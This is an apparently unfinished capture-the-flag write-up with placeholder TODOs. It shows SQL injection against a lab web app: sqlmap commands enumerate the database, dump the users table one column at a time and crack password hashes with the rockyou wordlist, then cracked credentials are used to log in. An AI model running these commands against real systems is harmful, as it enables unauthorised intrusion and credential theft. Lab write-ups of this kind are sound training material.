inspecting the page there are

/system/login endpoint
suspicous GET /image?type=data

seems to be a vulnerable endpoint

let's feed it to sqlmap

sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1"

> "GET parameter 'type' is vulnerable <todo pic>

it's MySQL
it say boolean-based blind, error-based, time-based blind 


let's enumerate tables for current database:

sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" --current-db 
> navigation


sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" -D navigation  --tables
<todo pic>

So there are 3 tables

I tried to fetch DETAIL(S) column from targets but apparently there isn't any and I couldn't enumerate columns of the tables.

So I tried dumping the `users` and see if I can login



These don't work, no results, why?
sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" -D navigation -T users --columns
sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" -D navigation -T users --dump


I tried some by hand
id, username, password, active
sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" -D navigation -T users -C id --dump
1, 2, 3
sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" -D navigation -T users -C username --dump
captain, engeneer, officer
sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" -D navigation -T users -C active --dump
0, 1, 1
sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" -D navigation -T users -C rank --dump
0, 1, 1

I also couldn't query more than one column at once so I didn't know which username has which values but given there are only 3, it's not so bad

dumping `password` also offered cracking the hash using the rockyou wordlist
sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1" -D navigation -T users -C password --dump
<TODO>
->

Trying combinations:
engineer/123456789 works but that's the deactivated account
captain/$captainamerica$ loggin as that and clicking on Details for Target #4:
<todo>





TODO the errors
